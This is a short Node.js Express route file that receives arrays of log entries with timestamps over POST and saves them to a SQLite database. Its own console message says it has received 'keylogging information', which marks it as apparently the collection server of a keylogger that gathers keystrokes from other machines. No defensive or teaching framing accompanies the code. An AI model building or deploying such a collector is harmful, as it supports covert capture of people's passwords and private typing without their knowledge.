const app = require("express").Router();
const Database = require("better-sqlite3");
const bodyParser = require("body-parser");

const db = Database("database.db");

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.post("/", handleRequest, (req, res) => {
    let data = req.body.logs;
    const time = req.body.time;

    const finalData = data.join(" ")

    const insertDataStatement = db.prepare("INSERT INTO logs (log, time) VALUES (?, ?)");
    insertDataStatement.run(finalData, time);

    return res.send({
        success: true,
    });
});

function handleRequest(req, res, next) {
    console.log("I got new keylogging information.");
    next();
};

module.exports = app;